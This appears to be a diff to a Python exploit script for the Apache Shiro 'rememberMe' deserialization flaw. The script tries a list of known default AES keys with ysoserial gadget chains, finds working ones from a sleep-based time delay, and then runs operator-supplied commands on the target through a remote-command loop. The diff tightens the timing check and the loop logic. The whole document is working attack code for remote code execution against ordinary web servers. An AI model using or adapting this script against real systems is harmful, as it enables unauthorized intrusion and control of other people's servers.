@@ -9,6 +9,7 @@ import base64
 import uuid
 import subprocess
 import requests
+import time
 from Crypto.Cipher import AES
 
 if len(sys.argv)!=2:
@@ -29,18 +30,22 @@ url = sys.argv[1]
 cmd_sleep = 'sleep-5'
 ysoserial = 'ysoserial-sleep.jar'
 gadget_list = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","Spring1","Spring2","Jdk7u21","ROME","Clojure"]
-key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==", "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==", "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==", "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA=="]
-#key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA=="]
+#key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==", "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==", "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==", "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA=="]
+key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA=="]
+#key_list = ["kPH+bIxk5D2deZiIxcaaaA=="]
 
 header = {
 'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
 }
 
+key_succes=0
+gadget_succes=0
 
 print ("[*] Testing gadget")
 for gadget in gadget_list:
     print ("[*] Check gadget: " + gadget)
     for key in key_list:
+        print ("check key:"+ key)
         popen = subprocess.Popen(['java', '-jar', ysoserial, gadget, cmd_sleep], stdout=subprocess.PIPE)
         BS = AES.block_size
         pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
@@ -51,20 +56,24 @@ for gadget in gadget_list:
         base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
         payload = base64_ciphertext.decode()
         try:
+            start_time = time.time()
             r = requests.get(url, headers=header, cookies={'rememberMe': payload}, timeout=10)
-            time = r.elapsed.seconds
-            if time >= 5:
-                key_succes = key
-                gadget_succes = gadget
-                print ("[+] Find gadget: " + gadget_succes)
-            else:
-                key_failed = key
-                gadget_failed = gadget
-        except:
-            print ("[-] Check Failed: " + gadget)
-
-print ("[+] Find Key: " + key_succes)
-
+            if r.status_code == 200:
+                request_time = time.time() - start_time
+                request_time = round(request_time, 3)
+                if request_time >= 5.00:
+                    key_succes = key
+                    gadget_succes = gadget
+                    print ("[+] Find gadget: " + gadget_succes)
+                    print ("[+] Find Key: " + key_succes)
+                else:
+                    print ("key error")
+                    gadget_failed = gadget
+        except Exception as e:
+            print (e)
+        #找到gadget和key后就结束循环继续寻找gadget
+        if key_succes and gadget_succes:
+            break
 
 def exploit(url, cmd, key_succes, gadget_succes):
 
@@ -97,7 +106,7 @@ def exploit(url, cmd, key_succes, gadget_succes):
         print ("[-] Command Send Failed, Please Check (No Echo)")
 
 
-    
+
 if key_succes:
     while 1:
         system = input("[*] System (linux or windows): ")
